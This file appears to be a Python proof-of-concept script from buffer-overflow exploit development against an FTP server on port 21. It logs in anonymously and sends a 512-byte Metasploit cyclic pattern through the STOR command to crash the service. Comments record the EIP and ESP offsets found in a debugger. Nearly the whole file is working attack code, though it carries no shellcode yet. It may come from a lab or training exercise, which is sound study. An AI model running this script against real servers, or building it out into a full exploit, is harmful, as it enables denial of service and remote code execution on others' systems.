#!/usr/bin/env python3
import socket
import sys

# /usr/bin/msf-pattern_create -l 512
buf = b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar"

# See crash in Immunity Debugger with the following interesting values in regesters:
# EIP = 69413269
# ESP points to string starting with "i6Ai" (first 4 characters)

# EIP offset at 247
# /usr/bin/msf-pattern_offset -q 69413269
# [*] Exact match at offset 247

# ESP contents offset at 259
# /usr/bin/msf-pattern_offset -q i6Ai    
# [*] Exact match at offset 259

if len(sys.argv) < 2:
    print("Usage: ./poc.py <target-IP>")
    exit()

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((sys.argv[1], 21))
s.recv(1024)
s.send(b'USER anonymous\r\n')
s.recv(1024)
s.send(b'PASS anonymous\r\n')
s.recv(1024)
s.send(b'STOR' + buf + b'\r\n')
s.recv(1024)
s.send(b'QUIT\r\n')
s.close()